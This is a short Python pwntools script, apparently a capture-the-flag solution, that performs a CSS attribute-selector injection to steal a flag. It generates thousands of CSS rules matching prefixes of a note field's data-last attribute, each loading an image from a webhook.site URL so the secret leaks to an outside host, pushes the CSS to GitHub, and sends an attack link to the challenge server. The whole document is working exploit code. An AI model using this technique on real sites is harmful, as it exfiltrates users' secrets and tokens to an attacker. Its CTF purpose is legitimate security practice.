from pwn import *
import subprocess
import urllib.parse
import sys
import string

# pull repro to solve conflicts in case of changes in cname
subprocess.run(["bash", "-c", "git pull"])

# generate CSS
ALPHABET = string.ascii_lowercase + string.digits + "_{}"
prefix = sys.argv[1]
css = ""
for c in ALPHABET:
    for d in ALPHABET:
        for e in ALPHABET:
            css += f'#note-text-area[data-last^="{prefix+c+d+e}"]{{background-image:url("https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/{urllib.parse.quote(prefix+c+d+e)}.png");}}\n'
            css += f'#note-text-area[data-last$="{c+d+e}}}"]{{background-image:url("https://webhook.site/746de57f-9e50-4385-ad0b-452c40a0085b/{urllib.parse.quote(c+d+e)}.png");}}\n'   # This causes problems, since only one applies to #note-text-area
            # working alternative: apply to ::before, set content to trigger the loading of the image

# write css to file
with open("style.css", "w") as f:
    f.write(css)

# commit css to github
subprocess.run(["bash", "-c", "git commit -m 'Updated' style.css"])
subprocess.run(["bash", "-c", "git push"])

# wait manually until new CSS is hopefully provisioned
pause()

r = remote("35.204.174.120", 1337)

# solve proof of work
r.recvuntil(b"python3")
arg = r.recvline(keepends=False)
p = process(["bash", "-c", "python3" + arg.decode()])
p.recvline()
r.sendafter(b"Solution?", p.recvline())
p.close()

# send attack link
r.sendline(b"https://ctf0.jsapi.tech/index.html#attack.js")
r.interactive()
